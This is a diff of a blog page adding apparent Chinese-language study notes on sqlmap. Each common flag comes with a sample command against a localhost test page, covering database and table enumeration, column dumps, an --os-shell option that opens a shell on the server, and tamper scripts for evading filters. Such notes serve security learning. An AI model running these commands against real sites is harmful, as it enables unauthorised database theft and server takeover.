@@ -172,7 +172,20 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>SQLmap学习笔记</p>
+        <p>SQLmap学习笔记<br>–常用参数<br>-u 检测注入<br>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1”</p>
+<p>–data 针对POST请求的链接<br>python sqlmap.py -u “127.0.0.1/sql/0.php” –data=”id=1”</p>
+<p>–forms 检测表单是否存在注入<br>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” –forms</p>
+<p>–level 等级 1-5<br>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” –level 3</p>
+<p>–dbs 列出所有库<br>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” –dbs</p>
+<p>–current-db 列出当前库<br>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” –current-db</p>
+<p>–tables -D”” 指定库里的所有表<br>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” –tables -D”saltest”</p>
+<p>–tables 所有表<br>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” –tables</p>
+<p>–dump -T”” -D”” -C”” 指定列下的字段<br>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” –dump -T”news” -D “sqltest” -C”id”</p>
+<p>–current-user 当前用户名<br>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” –current-user</p>
+<p>–os-shell 打开一个终端<br>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” –os-shell</p>
+<p>-m 扫描文本里的地址<br>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” -m “绝对路径”</p>
+<p>-l 通过burp的日志文件检测注入<br>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” -l “文件路径”</p>
+<p>–tamper=”” Tamper脚本运用<br>python sqlmap.py -u “127.0.0.1/sql/0.php?id=1” –tamper=”between.py”</p>
 
       
 
